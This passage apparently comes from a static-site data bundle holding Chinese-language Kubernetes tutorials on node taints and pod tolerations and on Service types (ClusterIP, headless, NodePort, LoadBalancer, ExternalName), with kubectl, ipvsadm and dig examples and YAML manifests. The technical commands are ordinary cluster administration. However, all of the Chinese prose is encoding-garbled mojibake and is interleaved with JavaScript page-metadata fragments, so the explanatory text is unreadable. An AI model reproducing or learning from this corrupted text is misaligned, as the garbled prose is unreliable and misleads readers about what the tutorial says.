ææ¾ï¼ææ¶åæ­¢ node2 èç¹ï¼\n 2. ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:prefernoschedule ï¼ç¶ååå»º pod1 (pod1 å¯ä»¥)\n 3. ä¿®æ¹ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:noschedule ï¼ç¶ååå»º pod2 (pod1 æ­£å¸¸ pod2 å¤±è´¥)\n 4. ä¿®æ¹ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:noexecute ï¼ç¶ååå»º pod3 (3 ä¸ª pod é½å¤±è´¥)\n\n# ä¸ºnode1è®¾ç½®æ±¡ç¹(prefernoschedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:prefernoschedule\n\n# åå»ºpod1\n[root@k8s-master01 ~]# kubectl run taint1 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname                      ready   status    restarts   age     ip           node   \ntaint1-7665f7fd85-574h4   1/1     running   0          2m24s   10.244.1.59   node1    \n\n# ä¸ºnode1è®¾ç½®æ±¡ç¹(åæ¶prefernoscheduleï¼è®¾ç½®noschedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:prefernoschedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:noschedule\n\n# åå»ºpod2\n[root@k8s-master01 ~]# kubectl run taint2 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods taint2 -n dev -o wide\nname                      ready   status    restarts   age     ip            node\ntaint1-7665f7fd85-574h4   1/1     running   0          2m24s   10.244.1.59   node1 \ntaint2-544694789-6zmlf    0/1     pending   0          21s     <none>        <none>   \n\n# ä¸ºnode1è®¾ç½®æ±¡ç¹(åæ¶noscheduleï¼è®¾ç½®noexecute)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:noschedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:noexecute\n\n# åå»ºpod3\n[root@k8s-master01 ~]# kubectl run taint3 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname                      ready   status    restarts   age   ip       node     nominated \ntaint1-7665f7fd85-htkmp   0/1     pending   0          35s   <none>   <none>   <none>    \ntaint2-544694789-bn7wb    0/1     pending   0          35s   <none>   <none>   <none>     \ntaint3-6d78dbd749-tktkq   0/1     pending   0          6s    <none>   <none>   <none>     \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n> ä½¿ç¨ kubeadm æ­å»ºçéç¾¤ï¼é»è®¤å°±ä¼ç» master èç¹æ·»å ä¸ä¸ªæ±¡ç¹æ è®°ï¼æä»¥ pod å°±ä¸ä¼è°åº¦å° master èç¹ä¸.\n\nå®¹å¿ï¼tolerationï¼\n\nä¸é¢ä»ç»äºæ±¡ç¹çä½ç¨ï¼æä»¬å¯ä»¥å¨ node ä¸æ·»å æ±¡ç¹ç¨äºæç» pod è°åº¦ä¸æ¥ï¼ä½æ¯å¦æå°±æ¯æ³å°ä¸ä¸ª pod è°åº¦å°ä¸ä¸ªææ±¡ç¹ç node ä¸å»ï¼è¿æ¶ååºè¯¥æä¹åå¢ï¼è¿å°±è¦ä½¿ç¨å°å®¹å¿ã\n\n\n\n> æ±¡ç¹å°±æ¯æç»ï¼å®¹å¿å°±æ¯å¿½ç¥ï¼node éè¿æ±¡ç¹æç» pod è°åº¦ä¸å»ï¼pod éè¿å®¹å¿å¿½ç¥æç»\n\nä¸é¢åéè¿ä¸ä¸ªæ¡ä¾çä¸ææï¼\n\n 1. ä¸ä¸å°èï¼å·²ç»å¨ node1 èç¹ä¸æä¸äº noexecute çæ±¡ç¹ï¼æ­¤æ¶ pod æ¯è°åº¦ä¸ä¸å»ç\n 2. æ¬å°èï¼å¯ä»¥éè¿ç» pod æ·»å å®¹å¿ï¼ç¶åå°å¶è°åº¦ä¸å»\n\nåå»º pod-toleration.yaml, åå®¹å¦ä¸\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-toleration\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  tolerations:      # æ·»å å®¹å¿\n  - key: "tag"        # è¦å®¹å¿çæ±¡ç¹çkey\n    operator: "equal" # æä½ç¬¦\n    value: "heima"    # å®¹å¿çæ±¡ç¹çvalue\n    effect: "noexecute"   # æ·»å å®¹å¿çè§åï¼è¿éå¿é¡»åæ è®°çæ±¡ç¹è§åç¸å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# æ·»å å®¹å¿ä¹åçpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname             ready   status    restarts   age   ip       node     nominated \npod-toleration   0/1     pending   0          3s    <none>   <none>   <none>           \n\n# æ·»å å®¹å¿ä¹åçpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname             ready   status    restarts   age   ip            node    nominated\npod-toleration   1/1     running   0          3s    10.244.1.62   node1   <none>        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nä¸é¢çä¸ä¸å®¹å¿çè¯¦ç»éç½®:\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.tolerations\n......\nfields:\n   key       \n   value     \n   operator  \n   effect    \n   tolerationseconds  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key å¯¹åºçè¦å®¹å¿çæ±¡ç¹çé®ï¼ç©ºæå³çå¹éææçé®\n * value å¯¹åºçè¦å®¹å¿çæ±¡ç¹çå¼\n * operator key-value çè¿ç®ç¬¦ï¼æ¯æ equal å existsï¼é»è®¤ï¼\n * effect å¯¹åºæ±¡ç¹ç effectï¼ç©ºæå³çå¹éææå½±å\n * tolerationseconds å®¹å¿æ¶é´ï¼å½ effect ä¸º noexecute æ¶çæï¼è¡¨ç¤º pod å¨ node ä¸çåçæ¶é´',charsets:{cjk:!0}},{title:"kubernetes(ä¹) Serviceä»ç»ãç±»ååä½¿ç¨",frontmatter:{title:"kubernetes(ä¹) Serviceä»ç»ãç±»ååä½¿ç¨",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/608",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/608.kubernetes(%E4%B9%9D)%20Service%E4%BB%8B%E7%BB%8D%E3%80%81%E7%B1%BB%E5%9E%8B%E5%8F%8A%E4%BD%BF%E7%94%A8.html",relativePath:"01.è¿ç»´/60.Kubernetes/608.kubernetes(ä¹) Serviceä»ç»ãç±»ååä½¿ç¨.md",key:"v-5019f548",path:"/kubernetes/608/",headers:[{level:2,title:"Serviceä»ç»",slug:"serviceä»ç»",normalizedTitle:"service ä»ç»",charIndex:2},{level:2,title:"Serviceç±»å",slug:"serviceç±»å",normalizedTitle:"service ç±»å",charIndex:2300},{level:2,title:"Serviceä½¿ç¨",slug:"serviceä½¿ç¨",normalizedTitle:"service ä½¿ç¨",charIndex:3026},{level:3,title:"å®éªç¯å¢åå¤",slug:"å®éªç¯å¢åå¤",normalizedTitle:"å®éªç¯å¢åå¤",charIndex:3041},{level:3,title:"ClusterIPç±»åçService",slug:"clusteripç±»åçservice",normalizedTitle:"clusterip ç±»åç service",charIndex:4475},{level:3,title:"HeadLinessç±»åçService",slug:"headlinessç±»åçservice",normalizedTitle:"headliness ç±»åç service",charIndex:7662},{level:3,title:"NodePortç±»åçService",slug:"nodeportç±»åçservice",normalizedTitle:"nodeport ç±»åç service",charIndex:9573},{level:3,title:"LoadBalancerç±»åçService",slug:"loadbalancerç±»åçservice",normalizedTitle:"loadbalancer ç±»åç service",charIndex:10529},{level:3,title:"ExternalNameç±»åçService",slug:"externalnameç±»åçservice",normalizedTitle:"externalname ç±»åç service",charIndex:10687}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"Serviceä»ç» Serviceç±»å Serviceä½¿ç¨ å®éªç¯å¢åå¤ ClusterIPç±»åçService HeadLinessç±»åçService NodePortç±»åçService LoadBalancerç±»åçService ExternalNameç±»åçService",content:'# Service ä»ç»\n\nå¨ kubernetes ä¸­ï¼pod æ¯åºç¨ç¨åºçè½½ä½ï¼æä»¬å¯ä»¥éè¿ pod ç ip æ¥è®¿é®åºç¨ç¨åºï¼ä½æ¯ pod ç ip å°åä¸æ¯åºå®çï¼è¿ä¹å°±æå³çä¸æ¹ä¾¿ç´æ¥éç¨ pod ç ip å¯¹æå¡è¿è¡è®¿é®ã\n\nä¸ºäºè§£å³è¿ä¸ªé®é¢ï¼kubernetes æä¾äº Service èµæºï¼Service ä¼å¯¹æä¾åä¸ä¸ªæå¡çå¤ä¸ª pod è¿è¡èåï¼å¹¶ä¸æä¾ä¸ä¸ªç»ä¸çå¥å£å°åãéè¿è®¿é® Service çå¥å£å°åå°±è½è®¿é®å°åé¢ç pod æå¡ã\n\n\n\nService å¨å¾å¤æåµä¸åªæ¯ä¸ä¸ªæ¦å¿µï¼çæ­£èµ·ä½ç¨çå¶å®æ¯ kube-proxy æå¡è¿ç¨ï¼æ¯ä¸ª Node èç¹ä¸é½è¿è¡çä¸ä¸ª kube-proxy æå¡è¿ç¨ãå½åå»º Service çæ¶åä¼éè¿ api-server å etcd åå¥åå»ºç service çä¿¡æ¯ï¼è kube-proxy ä¼åºäºçå¬çæºå¶åç°è¿ç§ Service çåå¨ï¼ç¶åå®ä¼å°ææ°ç Service ä¿¡æ¯è½¬æ¢æå¯¹åºçè®¿é®è§åã\n\n\n\nè§åæ iptablesï¼ipvs ç­ï¼ç®åä»ç»ä¸ ipvs è§å\n\n[root@node1 ~]# ipvsadm -Ln\nIP Virtual Server version 1.2.1 (size=4096)\nProt LocalAddress:Port Scheduler Flags\n  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n10.97.97.97:80 æ¯ service æä¾çè®¿é®å¥å£ï¼å½è®¿é®è¿ä¸ªå¥å£çæ¶åï¼å¯ä»¥åç°åé¢æä¸ä¸ª pod çæå¡å¨ç­å¾è°ç¨ï¼kube-proxy ä¼åºäº rrï¼è½®è¯¢ï¼çç­ç¥ï¼å°è¯·æ±ååå°å¶ä¸­ä¸ä¸ª pod ä¸å»ï¼è¿ä¸ªè§åä¼åæ¶å¨éç¾¤åçææèç¹ä¸é½çæï¼æä»¥å¨ä»»ä½ä¸ä¸ªèç¹ä¸è®¿é®é½å¯ä»¥ã\n\nkube-proxy ç®åæ¯æä¸ç§å·¥ä½æ¨¡å¼:\nuserspace æ¨¡å¼\nuserspace æ¨¡å¼ä¸ï¼kube-proxy ä¼ä¸ºæ¯ä¸ä¸ª Service åå»ºä¸ä¸ªçå¬ç«¯å£ï¼åå Cluster IP çè¯·æ±è¢« Iptables è§åéå®åå° kube-proxy çå¬çç«¯å£ä¸ï¼kube-proxy æ ¹æ® LB ç®æ³éæ©ä¸ä¸ªæä¾æå¡ç Pod å¹¶åå¶å»ºç«é¾æ¥ï¼ä»¥å°è¯·æ±è½¬åå° Pod ä¸ã è¯¥æ¨¡å¼ä¸ï¼kube-proxy åå½äºä¸ä¸ªåå±è´è´£åè¡¡å¨çè§è²ãç±äº kube-proxy è¿è¡å¨ userspace ä¸­ï¼å¨è¿è¡è½¬åå¤çæ¶ä¼å¢å åæ ¸åç¨æ·ç©ºé´ä¹é´çæ°æ®æ·è´ï¼è½ç¶æ¯è¾ç¨³å®ï¼ä½æ¯æçæ¯è¾ä½ã\n\n\n\niptables æ¨¡å¼\niptables æ¨¡å¼ä¸ï¼kube-proxy ä¸º service åç«¯çæ¯ä¸ª Pod åå»ºå¯¹åºç iptables è§åï¼ç´æ¥å°åå Cluster IP çè¯·æ±éå®åå°ä¸ä¸ª Pod IPã è¯¥æ¨¡å¼ä¸ kube-proxy ä¸æ¿æåå±è´è´£åè¡¡å¨çè§è²ï¼åªè´è´£åå»º iptables è§åãè¯¥æ¨¡å¼çä¼ç¹æ¯è¾ userspace æ¨¡å¼æçæ´é«ï¼ä½ä¸è½æä¾çµæ´»ç LB ç­ç¥ï¼å½åç«¯ Pod ä¸å¯ç¨æ¶ä¹æ æ³è¿è¡éè¯ã\n\n\n\nipvs æ¨¡å¼\nipvs æ¨¡å¼å iptables ç±»ä¼¼ï¼kube-proxy çæ§ Pod çååå¹¶åå»ºç¸åºç ipvs è§åãipvs ç¸å¯¹ iptables è½¬åæçæ´é«ãé¤æ­¤ä»¥å¤ï¼ipvs æ¯ææ´å¤ç LB ç®æ³ã\n\n\n\næ­¤æ¨¡å¼å¿é¡»å®è£ ipvs åæ ¸æ¨¡åï¼å¦åä¼éçº§ä¸º iptablesï¼å¼å¯ ipvs\n\n[root@k8s-master01 ~]# kubectl edit cm kube-proxy -n kube-system\n# ä¿®æ¹mode: "ipvs"\n[root@k8s-master01 ~]# kubectl delete pod -l k8s-app=kube-proxy -n kube-system\n[root@node1 ~]# ipvsadm -Ln\nIP Virtual Server version 1.2.1 (size=4096)\nProt LocalAddress:Port Scheduler Flags\n  -> RemoteAddress:Port           Forward Weight ActiveConn InActConn\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# Service ç±»å\n\nService çèµæºæ¸åæä»¶ï¼\n\nkind: Service  # èµæºç±»å\napiVersion: v1  # èµæºçæ¬\nmetadata: # åæ°æ®\n  name: service # èµæºåç§°\n  namespace: dev # å½åç©ºé´\nspec: # æè¿°\n  selector: # æ ç­¾éæ©å¨ï¼ç¨äºç¡®å®å½åserviceä»£çåªäºpod\n    app: nginx\n  type: # Serviceç±»åï¼æå®serviceçè®¿é®æ¹å¼\n  clusterIP:  # èææå¡çipå°å\n  sessionAffinity: # sessionäº²åæ§ï¼æ¯æClientIPãNoneä¸¤ä¸ªéé¡¹ï¼å¯ä»¥æåä¸ä¸ªæºçè¯·æ±ï¼åå°ä¸ä¸ªå·ä½çPodä¸\n  ports: # ç«¯å£ä¿¡æ¯\n    - protocol: TCP \n      port: 3017  # serviceç«¯å£\n      targetPort: 5003 # podç«¯å£\n      nodePort: 31122 # ä¸»æºç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ntypeï¼\n\n * ClusterIPï¼é»è®¤å¼ï¼å®æ¯ Kubernetes ç³»ç»èªå¨åéçèæ IPï¼åªè½å¨éç¾¤åé¨è®¿é®\n * NodePortï¼å° Service éè¿æå®ç Node ä¸çç«¯å£æ´é²ç»å¤é¨ï¼éè¿æ­¤æ¹æ³ï¼å°±å¯ä»¥å¨éç¾¤å¤é¨è®¿é®æå¡\n * LoadBalancerï¼ä½¿ç¨å¤æ¥è´è½½åè¡¡å¨å®æå°æå¡çè´è½½ååï¼æ³¨ææ­¤æ¨¡å¼éè¦å¤é¨äºç¯å¢æ¯æ\n * ExternalNameï¼ æéç¾¤å¤é¨çæå¡å¼å¥éç¾¤åé¨ï¼ç´æ¥ä½¿ç¨\n\n\n# Service ä½¿ç¨\n\n\n# å®éªç¯å¢åå¤\n\nå¨ä½¿ç¨ service ä¹åï¼é¦åå©ç¨ Deployment åå»ºåº 3 ä¸ª podï¼æ³¨æè¦ä¸º pod è®¾ç½® app=nginx-pod çæ ç­¾\nåå»º deployment.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: apps/v1\nkind: Deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n[root@k8s-master01 ~]# kubectl create -f deployment.yaml\ndeployment.apps/pc-deployment created\n\n# æ¥çpodè¯¦æ\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nNAME                             READY   STATUS     IP            NODE     LABELS\npc-deployment-66cb59b984-8p84h   1/1     Running    10.244.1.39   node1    app=nginx-pod\npc-deployment-66cb59b984-vx8vx   1/1     Running    10.244.2.33   node2    app=nginx-pod\npc-deployment-66cb59b984-wnncx   1/1     Running    10.244.1.40   node1    app=nginx-pod\n\n# ä¸ºäºæ¹ä¾¿åé¢çæµè¯ï¼ä¿®æ¹ä¸ä¸å°nginxçindex.htmlé¡µé¢ï¼ä¸å°ä¿®æ¹çIPå°åä¸ä¸è´ï¼\n# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n# echo "10.244.1.39" > /usr/share/nginx/html/index.html\n\n#ä¿®æ¹å®æ¯ä¹åï¼è®¿é®æµè¯\n[root@k8s-master01 ~]# curl 10.244.1.39\n10.244.1.39\n[root@k8s-master01 ~]# curl 10.244.2.33\n10.244.2.33\n[root@k8s-master01 ~]# curl 10.244.1.40\n10.244.1.40\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# ClusterIP ç±»åç Service\n\næ¯éç¾¤åé¨å°åï¼åªè½éè¿ Node éç¾¤åé¨è®¿é®ï¼åå»º service-clusterip.yaml æä»¶\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-clusterip\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: 10.97.97.97 # serviceçipå°åï¼å¦æä¸åï¼é»è®¤ä¼çæä¸ä¸ª\n  type: ClusterIP\n  ports:\n  - port: 80  # Serviceç«¯å£       \n    targetPort: 80 # podç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-clusterip.yaml\nservice/service-clusterip created\n\n# æ¥çservice\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nNAME                TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)   AGE   SELECTOR\nservice-clusterip   ClusterIP   10.97.97.97   <none>        80/TCP    13s   app=nginx-pod\n\n# æ¥çserviceçè¯¦ç»ä¿¡æ¯\n# å¨è¿éæä¸ä¸ªEndpointsåè¡¨ï¼éé¢å°±æ¯å½åserviceå¯ä»¥è´è½½å°çæå¡å¥å£\n[root@k8s-master01 ~]# kubectl describe svc service-clusterip -n dev\nName:              service-clusterip\nNamespace:         dev\nLabels:            <none>\nAnnotations:       <none>\nSelector:          app=nginx-pod\nType:              ClusterIP\nIP:                10.97.97.97\nPort:              <unset>  80/TCP\nTargetPort:        80/TCP\nEndpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nSession Affinity:  None\nEvents:            <none>\n\n# æ¥çipvsçæ å°è§å\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n# è®¿é®10.97.97.97:80è§å¯ææ\n[root@k8s-master01 ~]# curl 10.97.97.97:80\n10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nEndpoint\n\nEndpoint æ¯ kubernetes ä¸­çä¸ä¸ªèµæºå¯¹è±¡ï¼å­å¨å¨ etcd ä¸­ï¼ç¨æ¥è®°å½ä¸ä¸ª service å¯¹åºçææ pod çè®¿é®å°åï¼å®æ¯æ ¹æ® service éç½®æä»¶ä¸­ selector æè¿°äº§ççã\n\nä¸ä¸ª Service ç±ä¸ç» Pod ç»æï¼è¿äº Pod éè¿ Endpoints æ´é²åºæ¥ï¼Endpoints æ¯å®ç°å®éæå¡çç«¯ç¹éåãæ¢å¥è¯è¯´ï¼service å pod ä¹é´çèç³»æ¯éè¿ endpoints å®ç°çã\n\n\n\nè´è½½ååç­ç¥\nå¯¹ Service çè®¿é®è¢«ååå°äºåç«¯ç Pod ä¸å»ï¼ç®å kubernetes æä¾äºä¸¤ç§è´è½½ååç­ç¥ï¼\n\n * å¦æä¸å®ä¹ï¼é»è®¤ä½¿ç¨ kube-proxy çç­ç¥ï¼æ¯å¦éæºãè½®è¯¢\n * åºäºå®¢æ·ç«¯å°åçä¼è¯ä¿ææ¨¡å¼ï¼å³æ¥èªåä¸ä¸ªå®¢æ·ç«¯åèµ·çææè¯·æ±é½ä¼è½¬åå°åºå®çä¸ä¸ª Pod ä¸\n   æ­¤æ¨¡å¼å¯ä»¥ä½¿å¨ spec ä¸­æ·»å  sessionAffinity:ClientIP éé¡¹\n\n# æ¥çipvsçæ å°è§åãrr è½®è¯¢ã\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n# å¾ªç¯è®¿é®æµè¯\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97:80; sleep 5; done;\n10.244.1.40\n10.244.1.39\n10.244.2.33\n10.244.1.40\n10.244.1.39\n10.244.2.33\n\n# ä¿®æ¹ååç­ç¥----sessionAffinity:ClientIP\n\n# æ¥çipvsè§åãpersistent ä»£è¡¨æä¹ã\n[root@k8s-master01 ~]# ipvsadm -Ln\nTCP  10.97.97.97:80 rr persistent 10800\n  -> 10.244.1.39:80               Masq    1      0          0\n  -> 10.244.1.40:80               Masq    1      0          0\n  -> 10.244.2.33:80               Masq    1      0          0\n\n# å¾ªç¯è®¿é®æµè¯\n[root@k8s-master01 ~]# while true;do curl 10.97.97.97; sleep 5; done;\n10.244.2.33\n10.244.2.33\n10.244.2.33\n  \n# å é¤service\n[root@k8s-master01 ~]# kubectl delete -f service-clusterip.yaml\nservice "service-clusterip" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# HeadLiness ç±»åç Service\n\nå¨æäºåºæ¯ä¸­ï¼å¼åäººåå¯è½ä¸æ³ä½¿ç¨ Service æä¾çè´è½½åè¡¡åè½ï¼èå¸æèªå·±æ¥æ§å¶è´è½½åè¡¡ç­ç¥ï¼éå¯¹è¿ç§æåµï¼kubernetes æä¾äº HeadLiness Serviceï¼è¿ç±» Service ä¸ä¼åé Cluster IPï¼å¦ææ³è¦è®¿é® serviceï¼åªè½éè¿ service çååè¿è¡æ¥è¯¢ã\n\nåå»º service-headliness.yaml\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-headliness\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  clusterIP: None # å°clusterIPè®¾ç½®ä¸ºNoneï¼å³å¯åå»ºheadliness Service\n  type: ClusterIP\n  ports:\n  - port: 80    \n    targetPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-headliness.yaml\nservice/service-headliness created\n\n# è·åserviceï¼ åç°CLUSTER-IPæªåé\n[root@k8s-master01 ~]# kubectl get svc service-headliness -n dev -o wide\nNAME                 TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)   AGE   SELECTOR\nservice-headliness   ClusterIP   None         <none>        80/TCP    11s   app=nginx-pod\n\n# æ¥çserviceè¯¦æ\n[root@k8s-master01 ~]# kubectl describe svc service-headliness  -n dev\nName:              service-headliness\nNamespace:         dev\nLabels:            <none>\nAnnotations:       <none>\nSelector:          app=nginx-pod\nType:              ClusterIP\nIP:                None\nPort:              <unset>  80/TCP\nTargetPort:        80/TCP\nEndpoints:         10.244.1.39:80,10.244.1.40:80,10.244.2.33:80\nSession Affinity:  None\nEvents:            <none>\n\n# æ¥çååçè§£ææåµ\n[root@k8s-master01 ~]# kubectl exec -it pc-deployment-66cb59b984-8p84h -n dev /bin/sh\n/ # cat /etc/resolv.conf\nnameserver 10.96.0.10\nsearch dev.svc.cluster.local svc.cluster.local cluster.local\n\n[root@k8s-master01 ~]# dig @10.96.0.10 service-headliness.dev.svc.cluster.local\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.40\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.1.39\nservice-headliness.dev.svc.cluster.local. 30 IN A 10.244.2.33\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# NodePort ç±»åç Service\n\nå¨ä¹åçæ ·ä¾ä¸­ï¼åå»ºç Service ç ip å°ååªæéç¾¤åé¨æå¯ä»¥è®¿é®ï¼å¦æå¸æå° Service æ´é²ç»éç¾¤å¤é¨ä½¿ç¨ï¼é£ä¹å°±è¦ä½¿ç¨å°å¦å¤ä¸ç§ç±»åç Serviceï¼ç§°ä¸º NodePort ç±»åãNodePort çå·¥ä½åçå¶å®å°±æ¯å° service çç«¯å£æ å°å° Node çä¸ä¸ªç«¯å£ä¸ï¼ç¶åå°±å¯ä»¥éè¿ NodeIp:NodePort æ¥è®¿é® service äºã\n\n\n\nåå»º service-nodeport.yaml\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-nodeport\n  namespace: dev\nspec:\n  selector:\n    app: nginx-pod\n  type: NodePort # serviceç±»å\n  ports:\n  - port: 80\n    nodePort: 30002 # æå®ç»å®çnodeçç«¯å£(é»è®¤çåå¼èå´æ¯ï¼30000-32767), å¦æä¸æå®ï¼ä¼é»è®¤åé\n    targetPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl create -f service-nodeport.yaml\nservice/service-nodeport created\n\n# æ¥çservice\n[root@k8s-master01 ~]# kubectl get svc -n dev -o wide\nNAME               TYPE       CLUSTER-IP      EXTERNAL-IP   PORT(S)       SELECTOR\nservice-nodeport   NodePort   10.105.64.191   <none>        80:30002/TCP  app=nginx-pod\n\n# æ¥ä¸æ¥å¯ä»¥éè¿çµèä¸»æºçæµè§å¨å»è®¿é®éç¾¤ä¸­ä»»æä¸ä¸ªnodeipç30002ç«¯å£ï¼å³å¯è®¿é®å°pod\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# LoadBalancer ç±»åç Service\n\nLoadBalancer å NodePort å¾ç¸ä¼¼ï¼ç®çé½æ¯åå¤é¨æ´é²ä¸ä¸ªç«¯å£ï¼åºå«å¨äº LoadBalancer ä¼å¨éç¾¤çå¤é¨åæ¥åä¸ä¸ªè´è½½åè¡¡è®¾å¤ï¼èè¿ä¸ªè®¾å¤éè¦å¤é¨ç¯å¢æ¯æçï¼å¤é¨æå¡åéå°è¿ä¸ªè®¾å¤ä¸çè¯·æ±ï¼ä¼è¢«è®¾å¤è´è½½ä¹åè½¬åå°éç¾¤ä¸­ã\n\n\n\n\n# ExternalName ç±»åç Service\n\nExternalName ç±»åç Service ç¨äºå¼å¥éç¾¤å¤é¨çæå¡ï¼å®éè¿ externalName å±æ§æå®å¤é¨ä¸ä¸ªæå¡çå°åï¼ç¶åå¨éç¾¤åé¨è®¿é®æ­¤ service å°±å¯ä»¥è®¿é®å°å¤é¨çæå¡äºã\n\n\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: service-externalname\n  namespace: dev\nspec:\n  type: ExternalName # serviceç±»å\n  externalName: www.baidu.com  #æ¹æipå°åä¹å¯ä»¥\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# åå»ºservice\n[root@k8s-master01 ~]# kubectl  create -f service-externalname.yaml\nservice/service-externalname created\n\n# ååè§£æ\n[root@k8s-master01 ~]# dig @10.96.0.10 service-externalname.dev.svc.cluster.local\nservice-externalname.dev.svc.cluster.local. 30 IN CNAME www.baidu.com.\nwww.baidu.com.          30      IN      CNAME   www.a.shifen.com.\nwww.a.shifen.com.       30      IN      A       39.156.66.18\nwww.a.shifen.com.       30      IN      A       39.156.66.14\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n',normalizedContent:'# service ä»ç»\n\nå¨ kubernetes ä¸­ï¼pod æ¯åºç¨ç¨åºçè½½ä½ï¼æä»¬å¯ä»¥éè¿ pod ç ip æ¥è®¿é®åºç¨ç¨åºï¼ä½æ¯ pod ç ip å°åä¸æ¯åºå®çï¼è¿ä¹å°±æå³çä¸æ¹ä¾¿ç´æ¥éç¨ pod ç ip å¯¹æå¡è¿è¡è®¿é®ã\n\nä¸ºäºè§£å³è¿ä¸ªé®é¢ï¼kubernetes æä¾äº service èµæºï¼service ä¼å¯¹æä¾åä¸ä¸ªæå¡çå¤ä¸ª pod è¿è¡èåï¼å¹¶ä¸æä¾ä¸ä¸ªç»ä¸çå¥å£å°åãéè¿è®¿é® service çå